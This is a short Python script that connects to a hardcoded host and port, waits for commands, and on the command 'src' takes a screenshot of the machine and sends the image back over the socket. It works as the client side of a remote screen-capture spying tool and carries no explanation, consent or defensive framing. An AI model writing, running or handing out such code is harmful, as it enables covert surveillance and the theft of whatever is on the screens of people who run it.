import pyautogui
import os
import socket
import time

def main():
    s = socket.socket()

    host = '10.0.3.4'
    port = 5000

    s.connect((host,port))

    while True:
        cmd = s.recv(1024).decode('latin-1')

        if cmd == 'src':
            src = pyautogui.screenshot()
            src.save('src.png')

            #SEND SIZE OF FILE TO SERVER
            src_size = os.path.getsize('src.png')
            s.send(str(src_size).encode('latin-1'))
            print(str(src_size))

            #SENDS FILE
            time.sleep(10)
            f = open('src.png', 'rb')
            while src_size != 0:
                content = f.read(src_size)
                s.send(content)
                src_size = 0
                f.close()


main()
            

        
        
